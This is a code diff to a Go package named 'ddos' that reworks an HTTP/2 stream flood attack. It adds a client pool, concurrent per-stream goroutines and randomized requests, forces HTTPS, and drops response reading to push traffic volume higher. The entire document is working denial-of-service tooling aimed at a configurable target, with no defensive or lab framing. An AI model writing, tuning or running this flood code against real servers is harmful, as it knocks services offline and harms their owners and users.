@@ -1,10 +1,9 @@
 package ddos
 
 import (
-	"io"
 	"net/http"
-	"net/url"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 )
@@ -16,43 +15,37 @@ func (d *DDoSAttack) startHTTP2StreamFlood() {
 
 // startHTTP2StreamFloodWorkers starts HTTP/2 stream flood workers
 func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
-	// Determine if we should use TLS (HTTP/2 requires TLS)
-	useTLS, _, targetURL := d.shouldUseTLS(d.config.TargetURL)
-	if !useTLS && !d.config.ForceTLS {
-		// HTTP/2 requires HTTPS, force it
-		if strings.HasPrefix(d.config.TargetURL, "http://") {
-			targetURL = strings.Replace(d.config.TargetURL, "http://", "https://", 1)
-		} else if !strings.HasPrefix(d.config.TargetURL, "https://") {
-			targetURL = "https://" + d.config.TargetURL
-		}
-	}
-
-	transport, err := d.createHTTP2Transport()
+	// Always use connection pool (required for efficiency)
+	pool, err := NewClientPool(d.config)
 	if err != nil {
 		return
 	}
+	d.clientPool = pool
 
-	// Configure proxy if enabled (single proxy mode)
-	if d.config.UseProxy && !d.config.RotateProxy && len(d.proxies) > 0 {
-		// Use first proxy for all requests
-		if parsedURL, err := url.Parse(d.proxies[0]); err == nil {
-			transport.Proxy = http.ProxyURL(parsedURL)
-		}
+	// Create request builder (always enabled with randomization)
+	if d.requestBuilder == nil {
+		d.requestBuilder = NewRequestBuilder(d.config)
 	}
 
-	client := &http.Client{
-		Transport: transport,
-		Timeout:   d.config.Timeout,
+	// Determine target URL (force HTTPS for HTTP/2)
+	targetURL := d.config.TargetURL
+	if !strings.HasPrefix(targetURL, "https://") {
+		if strings.HasPrefix(targetURL, "http://") {
+			targetURL = strings.Replace(targetURL, "http://", "https://", 1)
+		} else {
+			targetURL = "https://" + targetURL
+		}
 	}
 
 	for i := 0; i < numWorkers; i++ {
 		d.wg.Add(1)
-		go d.http2StreamFloodWorker(client, targetURL)
+		go d.http2StreamFloodWorkerWithPool(pool, targetURL)
 	}
 }
 
-// http2StreamFloodWorker floods server with HTTP/2 streams
-func (d *DDoSAttack) http2StreamFloodWorker(client *http.Client, targetURL string) {
+
+// http2StreamFloodWorkerWithPool floods server with HTTP/2 streams using connection pool
+func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL string) {
 	defer d.wg.Done()
 
 	for {
@@ -60,102 +53,65 @@ func (d *DDoSAttack) http2StreamFloodWorker(client *http.Client, targetURL strin
 		case <-d.ctx.Done():
 			return
 		default:
-			// Create multiple streams per connection
+			// Create streams concurrently
+			atomic.AddInt64(&d.totalBatches, 1)
+			var wg sync.WaitGroup
+			successCount := int64(0)
+
 			for i := 0; i < d.config.MaxStreamsPerConn; i++ {
-				select {
-				case <-d.ctx.Done():
-					return
-				default:
-					d.sendHTTP2StreamRequest(client, targetURL)
-				}
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					client := pool.GetClient()
+					if client == nil {
+						return
+					}
+
+					req, err := d.requestBuilder.(*RequestBuilder).BuildRequest()
+					if err != nil {
+						atomic.AddInt64(&d.requestsFailed, 1)
+						return
+					}
+
+					if d.sendHTTP2StreamRequestWithClient(client, req) {
+						successCount++
+					}
+				}()
+			}
+			wg.Wait()
+
+			if successCount > 0 {
+				atomic.AddInt64(&d.successfulBatches, 1)
 			}
 		}
 	}
 }
 
-// sendHTTP2StreamRequest sends a single HTTP/2 stream request
-func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL string) {
+
+// sendHTTP2StreamRequestWithClient sends a request using the provided client (for pool-based workers)
+func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *http.Request) bool {
 	atomic.AddInt64(&d.activeConns, 1)
 	defer atomic.AddInt64(&d.activeConns, -1)
 
-	// Create a new client for proxy rotation if needed
-	actualClient := client
-	var usedProxy string
-
-	if d.config.UseProxy && d.config.RotateProxy {
-		// Create a new transport with rotated healthy proxy
-		if proxyURL, ok := d.getNextProxy(); ok {
-			if parsedURL, err := url.Parse(proxyURL); err == nil {
-				usedProxy = proxyURL
-				transport, err := d.createHTTP2Transport()
-				if err == nil {
-					transport.Proxy = http.ProxyURL(parsedURL)
-					actualClient = &http.Client{
-						Transport: transport,
-						Timeout:   d.config.Timeout,
-					}
-				}
-			}
-		}
-	} else if d.config.UseProxy && !d.config.RotateProxy && len(d.proxies) > 0 {
-		// Single-proxy mode: track which proxy is used for health reporting
-		proxyURL := d.proxies[0]
-		if parsedURL, err := url.Parse(proxyURL); err == nil {
-			usedProxy = proxyURL
-			transport, err := d.createHTTP2Transport()
-			if err == nil {
-				transport.Proxy = http.ProxyURL(parsedURL)
-				actualClient = &http.Client{
-					Transport: transport,
-					Timeout:   d.config.Timeout,
-				}
-			}
-		}
-	}
-
-	var bodyReader io.Reader
-	if d.config.Body != "" {
-		bodyReader = strings.NewReader(d.config.Body)
-		atomic.AddInt64(&d.bytesSent, int64(len(d.config.Body)))
-	}
-
-	req, err := http.NewRequestWithContext(d.ctx, d.config.Method, targetURL, bodyReader)
-	if err != nil {
-		atomic.AddInt64(&d.requestsFailed, 1)
-		return
-	}
-
-	// Set headers
-	req.Header.Set("User-Agent", d.getRandomUserAgent())
-	req.Header.Set("Accept", "*/*")
-	for key, value := range d.config.Headers {
-		req.Header.Set(key, value)
-	}
+	req = req.WithContext(d.ctx)
 
 	startTime := time.Now()
 	atomic.AddInt64(&d.requestsSent, 1)
 
-	resp, err := actualClient.Do(req)
+	resp, err := client.Do(req)
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
-		// Track proxy failures for health monitoring
-		if usedProxy != "" {
-			d.markProxyFailure(usedProxy)
-		}
-		return
+		return false
 	}
 	defer resp.Body.Close()
 
-	// Read response body
-	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
-	atomic.AddInt64(&d.bytesReceived, int64(len(body)))
+	// Always skip response reading for maximum efficiency
+	resp.Body.Close()
 
 	responseTime := time.Since(startTime)
 	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 	atomic.AddInt64(&d.requestsSuccess, 1)
 
-	// Successful request through a proxy resets its failure counter
-	if usedProxy != "" {
-		d.markProxySuccess(usedProxy)
-	}
+	return true
 }
+
